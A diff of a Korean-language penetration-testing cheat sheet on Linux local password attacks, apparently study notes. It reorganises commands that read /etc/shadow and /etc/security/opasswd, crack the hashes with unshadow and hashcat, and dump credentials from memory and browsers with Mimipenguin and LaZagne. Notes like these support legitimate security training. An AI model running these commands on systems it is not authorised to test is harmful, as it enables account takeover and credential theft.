@@ -331,6 +331,40 @@ mimikatz # sekurlsa::credman
 <br/><br/>
 # 6. Linux Local Password Attacks
 
+## Shadow 파일
+- `$<type>$<salt>$<hashed>`
+
+### Algorithm Types
+| ID     | Cryptographic Hash Algorithm                                          |
+| ------ | --------------------------------------------------------------------- |
+| `1`    | [MD5](https://en.wikipedia.org/wiki/MD5)                              |
+| `2a`   | [Blowfish](https://en.wikipedia.org/wiki/Blowfish_\(cipher\))         |
+| `5`    | [SHA-256](https://en.wikipedia.org/wiki/SHA-2)                        |
+| `6`    | [SHA-512](https://en.wikipedia.org/wiki/SHA-2)                        |
+| `sha1` | [SHA1crypt](https://en.wikipedia.org/wiki/SHA-1)                      |
+| `y`    | [Yescrypt](https://github.com/openwall/yescrypt)                      |
+| `gy`   | [Gost-yescrypt](https://www.openwall.com/lists/yescrypt/2019/06/30/1) |
+| `7`    | [Scrypt](https://en.wikipedia.org/wiki/Scrypt)                        |
+
+### 저장된 오래된 비밀번호 확인
+```cat /etc/security/opasswd```
+
+<br/><br/>
+## Cracking Linux Credentials
+
+### Unshadow, Hashcat으로 Cracking
+- [unshadow](https://github.com/pmittaldev/john-the-ripper/blob/master/src/unshadow.c) : `passwd` 파일과 `shadow` 파일을 결합하여 크래킹에 적합한 단일 파일로 만듬
+```
+sudo cp /etc/passwd /tmp/passwd.bak 
+sudo cp /etc/shadow /tmp/shadow.bak 
+unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
+hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
+```
+
+### Hashcat으로 MD5 Hash Cracking
+```hashcat -m 500 -a 0 md5-hashes.list rockyou.txt```
+
+<br/><br/>
 ## 파일 검색
 
 ### 구성 파일 검색
@@ -363,14 +397,15 @@ mimikatz # sekurlsa::credman
 
 ### Log에서 특정 문자열 검색
 ```for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done```
+
 <br/><br/>
 ## Memory & Cache 검색
 
 ### Memory - Mimipenguin
-```python3 mimipenguin.py```
+```sudo python3 mimipenguin.py```
 
 ### Memory - LaZagne
-```python2.7 laZagne.py all```
+```sudo python2.7 laZagne.py all```
 
 <br/><br/>
 ## Browsers 검색
@@ -386,33 +421,4 @@ cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
 
 ### Browsers - LaZagne
 ```python3 laZagne.py browsers```
-
-<br/><br/>
-## Shadow 파일
-- `$<type>$<salt>$<hashed>`
-
-### Algorithm Types
-- `$1$` – MD5
-- `$2a$` – Blowfish
-- `$2y$` – Eksblowfish
-- `$5$` – SHA-256
-- `$6$` – SHA-512
-
-### 저장된 오래된 비밀번호 확인
-```cat /etc/security/opasswd```
-
-<br/><br/>
-## Shadow 파일
-
-### Unshadow, Hashcat으로 Cracking
-```
-sudo cp /etc/passwd /tmp/passwd.bak 
-sudo cp /etc/shadow /tmp/shadow.bak 
-unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
-hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
-```
-
-### Hashcat으로 MD5 Hash Cracking
-```hashcat -m 500 -a 0 md5-hashes.list rockyou.txt```
-
 
